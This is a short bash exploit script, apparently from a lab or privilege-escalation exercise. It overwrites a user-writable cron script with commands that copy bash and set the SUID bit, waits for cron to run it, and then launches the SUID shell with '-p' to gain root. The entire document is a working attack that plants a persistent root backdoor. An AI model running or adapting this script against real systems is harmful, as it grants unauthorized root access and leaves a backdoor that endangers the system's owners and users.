#!/usr/bin/env bash
set -e

# Exploit cron file overwrite: install SUID backdoor via cron script
cat > /home/lowpriv/cron.sh << 'EOF'
#!/bin/bash
cp /usr/bin/bash /home/lowpriv/bash
chmod +s /home/lowpriv/bash
EOF

sleep 65
/home/lowpriv/bash -p -c whoami
